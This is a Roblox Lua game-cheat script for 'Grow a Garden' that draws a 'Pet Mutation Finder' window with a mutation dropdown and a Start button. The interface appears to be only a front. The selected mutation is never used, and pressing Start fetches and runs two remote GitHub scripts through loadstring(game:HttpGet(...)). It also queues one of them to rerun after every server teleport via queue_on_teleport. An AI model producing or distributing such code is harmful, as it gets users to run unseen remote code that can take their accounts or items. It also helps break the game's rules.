local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetMutationFinder"
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 190)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -95)
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(85, 170, 255)
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame

local shadow = Instance.new("Frame")
shadow.Name = "Shadow"
shadow.Size = UDim2.new(1, 6, 1, 6)
shadow.Position = UDim2.new(0, -3, 0, -3)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.7
shadow.ZIndex = mainFrame.ZIndex - 1
shadow.Parent = mainFrame

local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0, 15)
shadowCorner.Parent = shadow

local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleBar

local titleFix = Instance.new("Frame")
titleFix.Size = UDim2.new(1, 0, 0, 12)
titleFix.Position = UDim2.new(0, 0, 1, -12)
titleFix.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
titleFix.BorderSizePixel = 0
titleFix.Parent = titleBar

local titleText = Instance.new("TextLabel")
titleText.Name = "TitleText"
titleText.Size = UDim2.new(1, -20, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "Pet Mutation Finder"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextScaled = true
titleText.TextXAlignment = Enum.TextXAlignment.Center
titleText.Font = Enum.Font.FredokaOne
titleText.Parent = titleBar

local dropdown = Instance.new("TextButton")
dropdown.Name = "Dropdown"
dropdown.Size = UDim2.new(0, 180, 0, 25)
dropdown.Position = UDim2.new(0.5, -90, 0, 50)
dropdown.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
dropdown.Text = "Select Mutation ▼"
dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
dropdown.TextSize = 14
dropdown.Font = Enum.Font.FredokaOne
dropdown.BorderSizePixel = 1
dropdown.BorderColor3 = Color3.fromRGB(85, 170, 255)
dropdown.ZIndex = 99
dropdown.Parent = mainFrame

local dropdownCorner = Instance.new("UICorner")
dropdownCorner.CornerRadius = UDim.new(0, 4)
dropdownCorner.Parent = dropdown

local dropdownList = Instance.new("Frame")
dropdownList.Name = "DropdownList"
dropdownList.Size = UDim2.new(0, 180, 0, 0)
dropdownList.Position = UDim2.new(0.5, -90, 0, 75)
dropdownList.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
dropdownList.BorderSizePixel = 1
dropdownList.BorderColor3 = Color3.fromRGB(85, 170, 255)
dropdownList.ClipsDescendants = true
dropdownList.Visible = false
dropdownList.ZIndex = 100
dropdownList.Parent = mainFrame

local listCorner = Instance.new("UICorner")
listCorner.CornerRadius = UDim.new(0, 4)
listCorner.Parent = dropdownList

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, 0, 1, 0)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 4
scrollFrame.ZIndex = 101
scrollFrame.Parent = dropdownList

local listLayout = Instance.new("UIListLayout")
listLayout.Parent = scrollFrame

local mutations = {"Ascended", "Rainbow", "Mega", "Golden", "Radiant", "Iron Skin", "Shiny", "Windy", "Inverted", "Frozen", "Shocked", "Fried", "Tiny"}
local selectedMutation = "Select Mutation"

for i, mutation in ipairs(mutations) do
    local option = Instance.new("TextButton")
    option.Size = UDim2.new(1, 0, 0, 20)
    option.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    option.Text = mutation
    option.TextColor3 = Color3.fromRGB(255, 255, 255)
    option.TextSize = 12
    option.Font = Enum.Font.FredokaOne
    option.BorderSizePixel = 0
    option.ZIndex = 102
    option.Parent = scrollFrame
    
    option.MouseEnter:Connect(function()
        option.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
    end)
    
    option.MouseLeave:Connect(function()
        option.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    end)
    
    option.MouseButton1Click:Connect(function()
        selectedMutation = mutation
        dropdown.Text = mutation .. " ▼"
        dropdownList.Visible = false
        TweenService:Create(dropdownList, TweenInfo.new(0.2), {Size = UDim2.new(0, 180, 0, 0)}):Play()
    end)
end

scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #mutations * 20)

dropdown.MouseButton1Click:Connect(function()
    if dropdownList.Visible then
        dropdownList.Visible = false
        TweenService:Create(dropdownList, TweenInfo.new(0.2), {Size = UDim2.new(0, 180, 0, 0)}):Play()
    else
        dropdownList.Visible = true
        TweenService:Create(dropdownList, TweenInfo.new(0.2), {Size = UDim2.new(0, 180, 0, math.min(#mutations * 20, 100))}):Play()
    end
end)

local startButton = Instance.new("TextButton")
startButton.Name = "StartButton"
startButton.Size = UDim2.new(0, 100, 0, 35)
startButton.Position = UDim2.new(0.5, -50, 0, 85)
startButton.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
startButton.Text = "Start"
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.TextScaled = true
startButton.Font = Enum.Font.FredokaOne
startButton.BorderSizePixel = 2
startButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
startButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = startButton

local noteText = Instance.new("TextLabel")
noteText.Name = "NoteText"
noteText.Size = UDim2.new(1, -20, 0, 45)
noteText.Position = UDim2.new(0, 10, 0, 130)
noteText.BackgroundTransparency = 1
noteText.Text = "Note: This requires multiple server restarts/rejoins and will take time to operate. Please be patient. You can AFK once you clicked the Start Button."
noteText.TextColor3 = Color3.fromRGB(200, 200, 200)
noteText.TextSize = 10
noteText.TextXAlignment = Enum.TextXAlignment.Center
noteText.TextYAlignment = Enum.TextYAlignment.Top
noteText.TextWrapped = true
noteText.Font = Enum.Font.GothamSemibold
noteText.Parent = mainFrame

local watermark = Instance.new("TextLabel")
watermark.Name = "Watermark"
watermark.Size = UDim2.new(1, 0, 0, 15)
watermark.Position = UDim2.new(0, 0, 1, -15)
watermark.BackgroundTransparency = 1
watermark.Text = "by @notjzee on TikTok | Jyzee Scripts on YouTube"
watermark.TextColor3 = Color3.fromRGB(120, 120, 120)
watermark.TextSize = 8
watermark.TextXAlignment = Enum.TextXAlignment.Center
watermark.TextYAlignment = Enum.TextYAlignment.Center
watermark.Font = Enum.Font.GothamSemibold
watermark.Parent = mainFrame

mainFrame.Active = true
mainFrame.Draggable = true

local dragging = false
local dragStart = nil
local startPos = nil

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        mainFrame.Draggable = false
    end
end)

titleBar.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

titleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
        mainFrame.Draggable = true
    end
end)

startButton.MouseEnter:Connect(function()
    TweenService:Create(startButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100, 185, 255)}):Play()
end)

startButton.MouseLeave:Connect(function()
    TweenService:Create(startButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(85, 170, 255)}):Play()
end)

startButton.MouseButton1Click:Connect(function()
    queue_on_teleport([[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/jzeerobloxscripts/grow-a-garden/refs/heads/main/qwerty/loop.lua"))()
    ]])
    wait(5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jzeerobloxscripts/grow-a-garden/refs/heads/main/qwerty/generalfunctions.lua"))()
end)
